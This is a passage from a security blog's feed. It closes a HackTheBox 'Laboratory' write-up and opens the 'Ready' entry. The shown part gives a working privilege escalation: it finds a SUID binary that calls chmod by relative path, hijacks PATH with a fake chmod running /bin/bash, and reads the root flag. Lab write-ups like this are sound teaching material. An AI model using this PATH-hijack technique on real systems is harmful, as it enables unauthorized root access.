+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-- 1 root messagebus 51344 Jun 11 18:22 /usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 473576 May 29  2020 /usr/lib/openssh/ssh-keysign&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We use &lt;code&gt;ltrace&lt;/code&gt; to see what binaries are called by the SUID one. We identify
+that the binary use a relative path call to &lt;code&gt;chmod&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dexter@laboratory:~$ ltrace docker-security&lt;/span&gt;
+&lt;span class="code-line"&gt;setuid(0)                                                                                                                                        = -1&lt;/span&gt;
+&lt;span class="code-line"&gt;setgid(0)                                                                                                                                        = -1&lt;/span&gt;
+&lt;span class="code-line"&gt;system(&amp;quot;chmod 700 /usr/bin/docker&amp;quot;chmod: changing permissions of &amp;#39;/usr/bin/docker&amp;#39;: Operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;no return ...&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- SIGCHLD (Child exited) ---&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;... system resumed&amp;gt; )                                                                                                                           = 256&lt;/span&gt;
+&lt;span class="code-line"&gt;system(&amp;quot;chmod 660 /var/run/docker.sock&amp;quot;chmod: changing permissions of &amp;#39;/var/run/docker.sock&amp;#39;: Operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;no return ...&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- SIGCHLD (Child exited) ---&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;... system resumed&amp;gt; )                                                                                                                           = 256&lt;/span&gt;
+&lt;span class="code-line"&gt;+++ exited (status 0) +++&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;So we simply create a new "&lt;code&gt;chmod&lt;/code&gt;" program and add it to our path to get a root
+shell and grab the flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dexter@laboratory:/tmp/.plop$ echo /bin/bash &amp;gt; chmod&lt;/span&gt;
+&lt;span class="code-line"&gt;dexter@laboratory:/tmp/.plop$ chmod +x chmod&lt;/span&gt;
+&lt;span class="code-line"&gt;dexter@laboratory:/tmp/.plop$ export PATH=./:$PATH&lt;/span&gt;
+&lt;span class="code-line"&gt;dexter@laboratory:/tmp/.plop$ echo $PATH&lt;/span&gt;
+&lt;span class="code-line"&gt;./:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin&lt;/span&gt;
+&lt;span class="code-line"&gt;dexter@laboratory:/tmp/.plop$ docker-security&lt;/span&gt;
+&lt;span class="code-line"&gt;root@laboratory:/tmp/.plop# cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;1b08ba51a612057b8aca9940e57fce77&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;A really interesting box that allow us to play with a real vulnerability from a
+bug bounty report. Maybe more a medium than an easy box.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="gitlab"></category></entry><entry><title>HTB: Ready</title><link href="https://maggick.fr/2021/05/htb-ready.html" rel="alternate"></link><published>2021-05-16T09:20:00+02:00</published><updated>2021-05-16T09:20:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-16:/2021/05/htb-ready.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ready card" class="align-left" src="/media/2021.05/ready_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/304"&gt;Ready&lt;/a&gt; published on
 December 12 2020 by
